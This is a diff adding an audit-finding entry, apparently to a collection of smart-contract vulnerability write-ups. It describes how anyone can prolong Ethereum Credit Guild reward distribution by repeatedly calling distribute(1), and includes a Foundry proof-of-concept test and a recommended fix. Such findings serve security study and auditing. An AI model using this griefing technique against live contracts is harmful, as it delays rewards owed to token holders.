@@ -339,3 +339,54 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 3.[Medium] Anyone can prolong the time for the rewards to get distributed
+
+## Minimum distribution
+
+- Summary: each time the distribute call occurs, the endTimestamp gets extended. An attacker could exploit this by repeatedly calling distribute(1) to distribute 1 wei of a credit token daily, thereby extending the distribution period by approximately three times.
+
+- Impact & Recommendation: Add a minimum required amount for calling distribute if it's not done by the ProfitManager, or change how rewards are interpolated.
+  🐬: [Source](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/966) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+
+    function testProlongDistribution() public {
+        token.mint(alice, 10e18);
+        token.mint(bobby, 20e18);
+        vm.prank(alice);
+        token.enterRebase();
+        vm.prank(bobby);
+        token.enterRebase();
+        token.mint(address(this), 41e18);
+        // Distribute 40 tokens
+        uint256 amountToDistribute = 40e18;
+        token.distribute(amountToDistribute);
+
+        // Attackers calls distribute(1) each day to only distribute 1 wei of a token
+        for(uint256 i = 0; i < 30; i++) {
+            vm.warp(block.timestamp + 1 days);
+            token.distribute(1);
+        }
+        uint256 distributedSupply = amountToDistribute - token.pendingDistributedSupply();
+        console.log("Distributed supply after 30 days:");
+        console.log("----------------------------------------------------");
+        console.log("Distributed supply         : ", distributedSupply);
+        console.log("Expected distributes supply: ", amountToDistribute);
+        for(uint256 i = 0; i < 60; i++) {
+            vm.warp(block.timestamp + 1 days);
+            token.distribute(1);
+        }
+        console.log();
+        distributedSupply = amountToDistribute - token.pendingDistributedSupply();
+        console.log("Distributed supply after 90 days:");
+        console.log("----------------------------------------------------");
+        console.log("Distributed supply         : ", distributedSupply);
+        console.log("Expected distributes supply: ", amountToDistribute);
+    }
+
+  ```
+
+  </details>
